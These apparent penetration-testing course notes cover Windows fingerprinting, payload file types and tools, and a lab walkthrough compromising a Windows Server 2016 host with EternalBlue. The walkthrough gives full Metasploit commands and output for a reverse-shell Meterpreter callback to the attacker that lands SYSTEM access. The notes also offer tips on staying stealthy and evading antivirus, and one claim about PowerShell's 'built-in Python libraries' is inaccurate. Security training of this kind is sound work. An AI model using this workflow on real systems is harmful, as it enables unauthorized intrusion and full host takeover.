# Shells & Payloads: Windows Enumeration, Payload Types & Compromise Walkthrough

---

## Table of Contents

1. [Fingerprinting a Windows host](#1-fingerprinting-a-windows-host)
2. [Three fingerprinting methods](#2-three-fingerprinting-methods)
3. [Windows payload file types](#3-windows-payload-file-types)
4. [Payload generation and delivery tools](#4-payload-generation-and-delivery-tools)
5. [Full compromise walkthrough: Windows Server 2016](#5-full-compromise-walkthrough-windows-server-2016)
6. [CMD vs. PowerShell: which shell to use](#6-cmd-vs-powershell-which-shell-to-use)
7. [WSL and PowerShell for Linux: a blind spot to know about](#7-wsl-and-powershell-for-linux-a-blind-spot-to-know-about)
8. [Cheat sheet](#8-cheat-sheet)

---

## 1. Fingerprinting a Windows host

Before you can build a useful payload, you need to know what you're targeting. The first question is usually: **is this machine running Windows?**

This section covers three quick fingerprinting techniques that together give you high confidence in answering that question. No single check is foolproof — firewalls, security tools, and network configuration can skew results — so the habit is to **use more than one check** before drawing a conclusion.

---

## 2. Three fingerprinting methods

### Method 1: TTL via ping

Every ICMP echo reply (ping response) includes a **Time To Live (TTL)** value — a counter that decrements by 1 at each network hop. Because different OSes start with different TTL values, the number you receive gives a hint about the target's OS.

```bash
$ ping 192.168.86.39

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

**TTL of 128 → almost certainly Windows.**

### Quick TTL reference

| Starting TTL | Likely OS |
|---|---|
| **128** | Windows (most common) |
| **32** | Windows (some older versions) |
| **64** | Linux / macOS |
| **255** | Cisco / network devices |

> **Why this still works despite hop decay:** Most real-world targets are fewer than 20 network hops away. Even if the value decrements a little in transit, 128 → 108 is still obviously Windows, not Linux's 64.

> **Caveat:** a firewall can drop ICMP entirely (ping gets no response), or some security configs can spoof TTL values. If ping doesn't work, move to the other methods.

---

### Method 2: Nmap OS detection

Nmap can fingerprint an OS by analyzing the **TCP/IP stack behavior** — things like how the target responds to specific packet types, window sizes, and other low-level quirks that differ between OS implementations. It compares these behaviors against a database of known OS fingerprints.

```bash
$ sudo nmap -v -O 192.168.86.39

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh

OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
```

**What gives it away here:** ports 135, 139, 445 are Windows RPC/SMB ports. Combined with the OS fingerprint, Nmap is confident this is **Windows 10, build 1709–1909**.

**If the scan returns weak results, try:**

```bash
$ sudo nmap -A -Pn 192.168.86.39
```

`-A` enables OS detection, version detection, script scanning, and traceroute combined. `-Pn` skips the host-discovery ping and treats the host as alive — useful when ICMP is blocked.

---

### Method 3: Banner grabbing with Nmap scripts

A **banner** is a text string a service sends back when you first connect to it — often announcing the software name and version. The Nmap script `banner.nse` connects to every open port and captures whatever response it gets.

```bash
$ sudo nmap -v 192.168.86.39 --script banner.nse

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required,
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
```

**What this tells us:** ports 135, 139, 443, and 445 didn't respond with identifiable banners, but ports 902 and 912 did — both running **VMware Authentication Daemon**. This machine is running VMware Workstation, which is a useful detail for further research (there may be known exploits for this version).

> **Think of banners like name tags on an office door.** Not everyone wears one, but the ones that do give you direct, specific information.

---

## 3. Windows payload file types

Before building a payload, you need to pick the **right file format** for your delivery method and target. Windows supports a range of executable file types — each with different characteristics and use cases.

| File Type | Extension | What it is | Pentest use |
|---|---|---|---|
| **DLL** | `.dll` | Dynamic Linking Library — shared code loaded by other programs | **DLL injection** or **DLL hijacking**: replace or inject a malicious DLL to inherit the privileges of the program that loads it, potentially reaching SYSTEM/bypassing UAC |
| **Batch file** | `.bat` | Plain text DOS script run by `cmd.exe` | Automate sequences of commands: open a port, run enumeration, pipe data back — simple but effective |
| **VBScript** | `.vbs` | Lightweight Microsoft scripting language | Primarily used in **phishing**: embedded in Office macro documents to execute code when a user clicks or enables macros |
| **MSI** | `.msi` | Windows Installer package | Craft a payload as an installer — run with `msiexec` for execution, often yields an elevated or reverse shell since installers commonly run with elevated rights |
| **PowerShell** | `.ps1` | Full scripting language + shell | Flexible, powerful, and deeply integrated into Windows — ideal for complex post-exploitation, interacting with .NET objects, cloud services, and more |

### Delivery method shapes payload choice

```
Can the user be tricked into running something?  → .bat, .exe, .msi (social engineering)
Is there an upload vulnerability on a web server? → .asp, .aspx, .php (web shell)
Do you need to abuse an existing process?         → .dll (injection/hijacking)
Do you need automated, complex post-exploitation? → .ps1 (PowerShell)
```

---

## 4. Payload generation and delivery tools

### Generation tools

| Tool | What it does |
|---|---|
| **MSFVenom + Metasploit** | Generate payloads for any OS, deliver via built-in modules, run post-exploitation — the go-to Swiss Army knife |
| **Payloads All The Things** | Community cheat sheet — quick one-liners and payload snippets for every scenario |
| **Mythic C2 Framework** | Alternative C2 (Command and Control) framework with its own payload generation, comparable to Metasploit Pro |
| **Nishang** | Collection of Offensive PowerShell scripts and implants — particularly useful for Windows-specific post-exploitation |
| **Darkarmour** | Generates obfuscated Windows binaries to help bypass AV signatures |

### Delivery / transfer tools

| Method / Tool | Best for |
|---|---|
| **Impacket** | Python toolkit for direct protocol interaction — `psexec`, `smbclient`, `wmi`, Kerberos; can spin up an SMB server to host files for transfer |
| **SMB shares** | Domain-joined environments — attacker can host a payload on an SMB share and have the target pull it |
| **Metasploit built-in** | Many MSF exploit modules build, stage, and execute the payload automatically |
| **FTP / TFTP / HTTP(S)** | Any open file-transfer service on the target can double as a payload upload channel |
| **Social engineering** | Email attachment, malicious download link, USB drop — the payload goes to the user, not the network service |

---

## 5. Full compromise walkthrough: Windows Server 2016

This walkthrough ties everything together: fingerprint → find exploit path → validate → deliver payload → catch shell.

### Step 1: Enumerate the host

```bash
$ nmap -v -A 10.129.201.97

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00

| smb-security-mode:
|   authentication_level: user
|_  message_signing: disabled (dangerous, but default)
```

**What we learned:**

| Finding | Significance |
|---|---|
| **Windows Server 2016 Standard, build 14393** | Specific OS version — useful for looking up known CVEs |
| **Hostname: SHELLS-WINBLUE** | Not domain-joined (Workgroup: WORKGROUP) |
| **Port 445 (SMB) open** | Classic attack surface for Windows |
| **SMB message signing: disabled** | A security weakness — signing disabled means SMB relay attacks are possible |
| **Port 80 (IIS 10.0) open** | A web server — potential upload/RCE vector |

**Potential attack paths from this scan:**

```
1. IIS (port 80)         → web-based RCE or file upload vulnerability
2. SMB (port 445)        → authenticated access via Impacket, or OS-level exploit
3. OS version (2016)     → MS17-010 (EternalBlue) affects Windows 2008 → 2016
```

**Decision:** Server 2016 falls squarely in EternalBlue's affected range — worth checking first since it's a reliable, well-understood exploit path.

---

### Step 2: Validate the EternalBlue vulnerability

Don't fire an exploit blind — use Metasploit's auxiliary **check** module first:

```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] Auxiliary module execution completed
```

Confirmed vulnerable. Now we can proceed confidently.

> **Why validate first?** Firing an exploit at a non-vulnerable target wastes time and can leave logs on the target. The check module confirms vulnerability without triggering the actual exploit — a quieter, more professional approach.

---

### Step 3: Select and configure the exploit

```
msf6 > search eternal

2  exploit/windows/smb/ms17_010_psexec   2017-03-14  normal  Yes  MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

```
msf6 > use 2

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

The **psexec** variant of EternalBlue is chosen here because it tends to be more reliable in practice than the EternalBlue-only module. (The two modules use slightly different internal mechanisms to achieve code execution — having more than one option in your toolkit is always better.)

```
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options:
   RHOSTS    (blank)       yes  → Target host
   RPORT     445           yes  → SMB port
   SHARE     ADMIN$        yes  → Admin share to upload through
   SMBUser   (blank)       no   → Optional credentials
   SMBPass   (blank)       no   → Optional credentials

Payload options (windows/meterpreter/reverse_tcp):
   LHOST  192.168.86.48    yes  → Your IP
   LPORT  4444             yes  → Your listening port
```

**Set the required options:**

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.12
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4444
```

The rest can stay at defaults — `SHARE ADMIN$` is fine since EternalBlue gives us SYSTEM-level access to write to admin shares.

---

### Step 4: Run it and catch the shell

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215)

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

**`NT AUTHORITY\SYSTEM`** — the highest privilege level on Windows. We landed directly at the top.

---

### Step 5: Identify and work with the native shell

```
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]

C:\Windows\system32>
```

**How to tell which shell you're in from the prompt:**

| Prompt | Shell |
|---|---|
| `C:\Windows\system32>` | `cmd.exe` (classic command prompt) |
| `PS C:\Windows\system32>` | PowerShell (the `PS` prefix is the tell) |

---

## 6. CMD vs. PowerShell: which shell to use

Once you're on a Windows target, you'll often have a choice between `cmd.exe` and PowerShell. The right answer depends on what you need to do.

### Side-by-side comparison

| Factor | CMD (`cmd.exe`) | PowerShell |
|---|---|---|
| **Origins** | Original MS-DOS shell, decades old | Modern Microsoft shell, introduced with Windows 7 |
| **Language** | Text-based commands | .NET-based objects — input/output are .NET objects, not strings |
| **Availability** | Present on all Windows versions, including XP | Windows 7 and later only |
| **Automation** | Batch files (`.bat`) only | Full scripting language (`.ps1`), cmdlets, modules |
| **Command history** | No session history kept | History is kept — leaves traces |
| **Stealth** | ✅ Less trace on the host | ⚠️ Commands logged — less stealthy |
| **Execution policy** | Not affected | Can be blocked by Execution Policy restrictions |
| **UAC** | Affected | Affected |
| **Cloud / .NET interaction** | ❌ No | ✅ Yes |

### Decision flow

```
Is the target Windows XP or very old?
        │
        ├── Yes → Use CMD (PowerShell isn't available)
        │
        └── No
                │
                ▼
        Do you need .NET objects, cloud interaction, or complex scripts?
                │
                ├── Yes → PowerShell
                │
                └── No
                        │
                        ▼
                Is stealth a priority?
                        │
                        ├── Yes → CMD (no history logging)
                        │
                        └── No → Either works; PowerShell for more power
```

### In plain terms

> Use **CMD** when you want to stay quiet, do simple things, or you're on an old system.  
> Use **PowerShell** when you need muscle — scripting, .NET access, cloud interaction, or running custom modules.

---

## 7. WSL and PowerShell for Linux: a blind spot to know about

Two relatively new Windows features are worth flagging as emerging attack surfaces that security tooling doesn't fully cover yet:

### Windows Subsystem for Linux (WSL)

WSL embeds a full Linux environment inside Windows. As of this module's writing:

- **Network requests from WSL instances bypass the Windows Firewall and Windows Defender** — traffic going to/from WSL is not inspected.
- Attackers have been observed using Python3 and native Linux binaries inside WSL to download and deploy payloads on Windows hosts, avoiding detection.

### PowerShell Core on Linux

PowerShell is no longer Windows-only — it can be installed on Linux. Cross-platform attack techniques that use PowerShell's built-in Python libraries and .NET bindings have been seen:

- Bypassing AV and EDR on Windows by routing activity through the Linux-side channel.
- Exploiting trust in outbound connections that security tools don't fully inspect.

> **Note:** these are advanced topics beyond this module's scope, but awareness of them is important. Dedicated modules covering AV/EDR evasion will go deeper — keep these in mind when you get there.

---

## 8. Cheat sheet

### Windows fingerprinting quick reference

| Method | Command | Windows indicator |
|---|---|---|
| Ping TTL | `ping <target>` | TTL of 128 (or 32) |
| OS detection | `sudo nmap -v -O <target>` | "Microsoft Windows" in OS details |
| Aggressive scan | `sudo nmap -A -Pn <target>` | Use when standard OS detection fails |
| Banner grab | `sudo nmap --script banner.nse <target>` | Service banners on open ports |

### Windows payload types at a glance

| Type | Extension | Best for |
|---|---|---|
| DLL | `.dll` | Injection / hijacking running processes |
| Batch | `.bat` | Simple automation in cmd.exe |
| VBScript | `.vbs` | Phishing / macro-enabled documents |
| MSI Installer | `.msi` | Payload delivery disguised as an installer |
| PowerShell | `.ps1` | Complex automation, .NET interaction |

### The compromise workflow

```
1. nmap -v -A <target>              → Find OS, services, open ports
2. Identify attack path              → SMB? IIS? Known CVE?
3. use auxiliary/scanner/smb/...    → Validate before exploiting
4. search <cve or service>          → Find the exploit module
5. use <module>, set options        → RHOSTS, LHOST, LPORT
6. exploit                          → Run it
7. meterpreter > shell              → Drop into CMD/PowerShell
8. Identify prompt type             → C:\> = CMD, PS C:\> = PowerShell
```

### CMD vs. PowerShell one-liner decision

```
Old host / XP        → CMD only
Stealth priority     → CMD
Scripting / .NET     → PowerShell
Default / general    → Either; PowerShell for more power
```

### Big-picture takeaways

1. **Use multiple fingerprinting methods.** TTL + Nmap OS detection + banner grabbing together give high confidence.
2. **TTL 128 = Windows** in most real-world scenarios — firewall permitting.
3. **Payload file type follows delivery method:** social engineering → `.exe`/`.msi`/`.bat`; process abuse → `.dll`; web upload → `.asp`/`.aspx`.
4. **Always validate with an auxiliary check module before firing the exploit** — quieter and more professional.
5. **EternalBlue (MS17-010) affects Windows 2008 → 2016** — a wide target range worth checking whenever you see old SMB ports open.
6. **`NT AUTHORITY\SYSTEM` from EternalBlue** — the exploit can drop you directly at the highest privilege level on Windows.
7. **CMD leaves less trace than PowerShell** — session history isn't kept. Use CMD when stealth matters.
8. **WSL and PowerShell Core on Linux are emerging blind spots** — they can bypass Windows Firewall and Defender inspection. Worth watching in future AV evasion content.

---
